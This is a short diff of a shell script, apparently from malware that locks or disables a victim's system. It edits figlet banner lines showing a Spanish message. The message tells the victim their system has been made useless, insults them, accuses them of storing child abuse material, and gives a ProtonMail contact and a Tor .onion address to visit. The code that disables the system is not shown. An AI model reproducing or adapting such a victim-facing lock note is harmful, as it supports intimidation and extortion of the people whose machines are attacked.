@@ -8,9 +8,9 @@ PS1='\$ '
 
 echo "==================================================================================================================================="
 
-figlet -t -k -c Te preguntaras que ha pasado? Te he dejado inutil tu sistema, te mereces que te protejamos. Asi aprenderas lo que
-figlet -t -k -c tienes  
-figlet -t -k -c que hacer en el ciberespacio. Contadtame; Viphops3r@protonmail.ch
+figlet -t -k -c Te preguntaras que ha pasado? Te he dejado inutil tu sistema, te lo mereces hijo de puta. Asi aprenderas a no guardar CP
+figlet -t -k -c en  
+figlet -t -k -c tu galeria. Contadtame; Viphops3r@protonmail.ch
 figlet -t -k -c Descarga el TOR y visita esta pagina-- http://a6lkky6v2jelknpus5c6z2qff3wj2x4gw4thwy6rddxfjyr5ndsjabyd.onion/
 figlet -t -k -c Todo se hace de buen corazon y por tener una mejor sociedad. Cuidate hermano.
 
